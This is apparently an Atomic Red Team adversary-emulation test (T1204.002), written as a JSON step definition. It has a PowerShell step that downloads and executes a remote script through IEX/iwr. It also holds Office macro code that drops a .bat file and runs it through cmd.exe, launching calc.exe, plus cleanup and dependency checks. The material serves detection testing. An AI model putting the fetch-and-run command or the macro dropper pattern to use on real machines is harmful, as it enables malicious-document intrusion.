@@ -1,0 +1,111 @@
+{
+  "id": "9215ea92-1ded-41b7-9cd6-79f9a78397aa",
+  "name": "Office launching .bat file from AppData",
+  "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "962262e5-b305-4497-b38a-be1095bd6ae9",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "55f5fa19-2821-4299-a3d2-28fd224d2653",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item #{bat_path} -ErrorAction Ignore\nGet-Process | Where-Object { $_.MainModule.FileName -like \"*calculator*\" } | Stop-Process\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fead3c6f-92d5-4b34-9c1e-6148a5d11bf0",
+      "name": "Check dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "aff01181-dda2-4374-b406-c1527e28b560",
+      "name": "Resolve dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c45efe99-5a53-4620-af24-febe7b4aecbd",
+      "name": "Re-check dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "962262e5-b305-4497-b38a-be1095bd6ae9",
+      "p": "on-success",
+      "o": "55f5fa19-2821-4299-a3d2-28fd224d2653"
+    },
+    {
+      "s": "962262e5-b305-4497-b38a-be1095bd6ae9",
+      "p": "on-failure",
+      "o": "55f5fa19-2821-4299-a3d2-28fd224d2653"
+    },
+    {
+      "s": "fead3c6f-92d5-4b34-9c1e-6148a5d11bf0",
+      "p": "on-success",
+      "o": "962262e5-b305-4497-b38a-be1095bd6ae9"
+    },
+    {
+      "s": "fead3c6f-92d5-4b34-9c1e-6148a5d11bf0",
+      "p": "on-failure",
+      "o": "aff01181-dda2-4374-b406-c1527e28b560"
+    },
+    {
+      "s": "aff01181-dda2-4374-b406-c1527e28b560",
+      "p": "on-success",
+      "o": "c45efe99-5a53-4620-af24-febe7b4aecbd"
+    },
+    {
+      "s": "c45efe99-5a53-4620-af24-febe7b4aecbd",
+      "p": "on-failure",
+      "o": "962262e5-b305-4497-b38a-be1095bd6ae9"
+    }
+  ],
+  "tags": [
+    "T1204.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "bat_path",
+      "type": "string",
+      "description": "Path to malicious .bat file",
+      "value": "$(\"$env:temp\\art1204.bat\")"
+    },
+    {
+      "name": "ms_product",
+      "type": "string",
+      "description": "Maldoc application Word or Excel",
+      "value": "Word"
+    }
+  ]
+}
